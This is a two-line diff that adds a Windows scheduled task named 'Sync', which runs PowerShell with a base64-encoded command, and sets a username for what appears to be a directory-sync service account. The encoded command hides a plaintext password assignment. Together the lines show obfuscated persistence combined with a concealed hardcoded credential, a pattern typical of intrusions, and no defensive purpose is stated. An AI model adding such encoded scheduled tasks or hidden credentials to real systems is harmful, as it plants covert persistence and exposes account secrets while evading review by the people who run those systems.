@@ -1,0 +1,2 @@
+schtasks /create /tn Sync /tr "powershell.exe -NoProfile -EncodedCommand JABwACAAPQAgACcAUwBvAG0AbQBhAHIAMgAwADIANAAhACcA"
+$Username = 'svc-adsync'
